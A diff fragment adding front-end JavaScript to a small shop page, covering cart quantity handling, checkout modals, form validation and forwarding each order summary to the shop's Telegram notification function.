+      btn.addEventListener('click', function() {
+        const index = parseInt(this.dataset.index);
+        cart[index].quantity++;
+        updateCartDisplay();
+        updateCartCount();
+      });
+    });
+
+    cartItems.querySelectorAll('.qty-input').forEach(input => {
+      input.addEventListener('change', function() {
+        const index = parseInt(this.dataset.index);
+        const newQty = parseInt(this.value);
+        if (!isNaN(newQty) && newQty > 0) {
+          cart[index].quantity = newQty;
+          updateCartDisplay();
+          updateCartCount();
+        } else {
+          this.value = cart[index].quantity;
+        }
+      });
+    });
+
+    cartItems.querySelectorAll('.remove-item').forEach(btn => {
+      btn.addEventListener('click', function() {
+        const index = parseInt(this.dataset.index);
+        cart.splice(index, 1);
+        updateCartDisplay();
+        updateCartCount();
+      });
+    });
+  }
+
+  // --- Add to cart ---
+  function addToCartHandler() {
+    const productName = this.dataset.product;
+    const productPrice = parseFloat(this.dataset.price);
+    const productImg = this.dataset.img;
+    const qtyInput = this.closest('.product-card').querySelector('.qty-input');
+    const quantity = qtyInput ? (parseInt(qtyInput.value) || 1) : 1;
+
+    const existingItemIndex = cart.findIndex(item => item.name === productName);
+    if (existingItemIndex >= 0) {
+      cart[existingItemIndex].quantity += quantity;
+    } else {
+      cart.push({ name: productName, price: productPrice, img: productImg, quantity });
+    }
+
+    updateCartDisplay();
+    updateCartCount();
+    alert(`Added ${quantity} ${productName}(s) to your cart!`);
+  }
+
+  // --- Qty buttons ---
+  function quantityButtonHandler() {
+    const input = this.parentElement.querySelector('.qty-input');
+    let value = parseInt(input.value) || 1;
+    if (this.classList.contains('minus')) {
+      if (value > 1) input.value = value - 1;
+    } else {
+      input.value = value + 1;
+    }
+  }
+
+  reinitializeEventListeners();
+
+  // --- Cart / checkout modals ---
+  if (cartLink) {
+    cartLink.addEventListener('click', function(e) {
+      e.preventDefault();
+      if (cartModal) cartModal.classList.add('active');
+      if (overlay) overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    });
+  }
+
+  if (closeCart) closeCart.addEventListener('click', function() {
+    if (cartModal) cartModal.classList.remove('active');
+    if (overlay) overlay.classList.remove('active');
+    document.body.style.overflow = 'auto';
+  });
+
+  if (checkoutBtn) {
+    checkoutBtn.addEventListener('click', function() {
+      if (cart.length > 0) {
+        if (productInput) productInput.value = cart.map(item => `${item.name} (x${item.quantity})`).join(', ');
+        if (quantityInput) quantityInput.value = cart.reduce((t, i) => t + i.quantity, 0);
+        if (checkoutModal) checkoutModal.classList.add('active');
+        if (overlay) overlay.classList.add('active');
+        if (cartModal) cartModal.classList.remove('active');
+        document.body.style.overflow = 'hidden';
+      }
+    });
+  }
+
+  if (closeCheckout) closeCheckout.addEventListener('click', function() {
+    if (checkoutModal) checkoutModal.classList.remove('active');
+    if (overlay) overlay.classList.remove('active');
+    document.body.style.overflow = 'auto';
+  });
+
+  if (overlay) overlay.addEventListener('click', function() {
+    if (cartModal) cartModal.classList.remove('active');
+    if (checkoutModal) checkoutModal.classList.remove('active');
+    if (overlay) overlay.classList.remove('active');
+    document.body.style.overflow = 'auto';
+  });
+
+  if (checkoutForm) {
+    checkoutForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const name = $id('name')?.value || '';
+      const email = $id('email')?.value || '';
+      const phone = $id('phone')?.value || '';
+      const address = $id('address')?.value || '';
+      const product = productInput ? productInput.value : '';
+      const quantity = quantityInput ? quantityInput.value : '';
+      const opinion = $id('opinion')?.value || '';
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email)) { alert('Please enter a valid email address.'); return; }
+      const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
+      if (!phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''))) { alert('Please enter a valid phone number.'); return; }
+
+      console.log('Order Details:', { name, email, phone, address, product, quantity, opinion, total: cartTotal?.textContent });
+      alert('Thank you for your order! We will contact you shortly to confirm your purchase.');
+
+      const message = `
+🛒 <b>New Order Received!</b>
+
+👤 <b>Customer:</b> ${name}
+📧 <b>Email:</b> ${email}
+📞 <b>Phone:</b> ${phone}
+📍 <b>Address:</b> ${address}
+
+🛍️ <b>Product:</b> ${product}
+🔢 <b>Quantity:</b> ${quantity}
+
+💬 <b>Customer Opinion:</b>
+${opinion}
+
+💰 <b>Total:</b> ${cartTotal?.textContent}
+      `;
+      await sendToTelegram(message);
+      
+      // Save order to user manager if logged in
+      if (UserManager.currentUser) {
+        await UserManager.saveOrder({
+          items: cart,
+          total: cart.reduce((total, item) => total + (item.price * item.quantity), 0)
+        });
+      }
+      
+      checkoutForm.reset();
+      if (checkoutModal) checkoutModal.classList.remove('active');
+      if (overlay) overlay.classList.remove('active');
+      document.body.style.overflow = 'auto';
+
+      cart = [];
+      updateCartDisplay();
+      updateCartCount();
+    });
+  }
+
+  // init UI
+  updateCartDisplay();
+  updateCartCount();
+  UserManager.checkLogin();
+  initializeUserManager(); // Initialize user manager events
+});
+</script>
+ 
+<!-- Image Zoom Modal -->
+<div class="image-modal" id="imageModal">
+    <span class="close-zoom">&times;</span>
+    <img class="modal-content" id="modalImage">
+</div>
+</body>
+</html>
+
+
